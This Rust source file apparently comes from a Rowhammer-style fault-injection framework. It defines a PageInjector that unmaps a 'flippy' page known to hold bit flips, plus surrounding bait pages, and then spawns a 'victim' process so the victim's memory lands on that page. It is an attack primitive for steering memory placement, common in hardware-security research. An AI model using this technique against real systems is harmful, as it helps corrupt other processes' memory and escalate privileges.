use std::{
    process::{Child, Command},
    ptr::null_mut,
};

use crate::{
    allocator::util::{mmap, munmap},
    util::PAGE_SIZE,
};

/// The injection configuration.
pub struct InjectionConfig {
    /// The flippy page.
    pub flippy_page: *mut libc::c_void,
    /// The flippy page size.
    pub flippy_page_size: usize,
    /// The number of bait pages to release before the flippy page.
    pub bait_count_after: usize,
    /// The number of bait pages to release after the flippy page.
    pub bait_count_before: usize,
}

pub struct PageInjector {
    injection_config: InjectionConfig,
}

impl PageInjector {
    pub fn new(injection_config: InjectionConfig) -> Self {
        Self { injection_config }
    }
}

impl PageInjector {
    pub fn inject(&self, mut cmd: Command) -> Result<Child, std::io::Error> {
        let bait: *mut libc::c_void = if self.injection_config.bait_count_before
            + self.injection_config.bait_count_after
            != 0
        {
            mmap(
                null_mut(),
                (self.injection_config.bait_count_before + self.injection_config.bait_count_after)
                    * PAGE_SIZE,
            )
        } else {
            null_mut()
        };
        //set_process_affinity(unsafe { libc::getpid() }, get_current_core());

        // TODO refactor InjectionStrategy
        info!("deallocating bait");
        unsafe {
            if self.injection_config.bait_count_before != 0 {
                munmap(bait, self.injection_config.bait_count_before * PAGE_SIZE);
            }
            munmap(
                self.injection_config.flippy_page,
                self.injection_config.flippy_page_size,
            );
            if self.injection_config.bait_count_after != 0 {
                munmap(
                    bait.byte_add(self.injection_config.bait_count_before * PAGE_SIZE),
                    self.injection_config.bait_count_after * PAGE_SIZE,
                );
            }
        }
        // spawn
        //info!("Launching victim");
        cmd.spawn()
    }
}
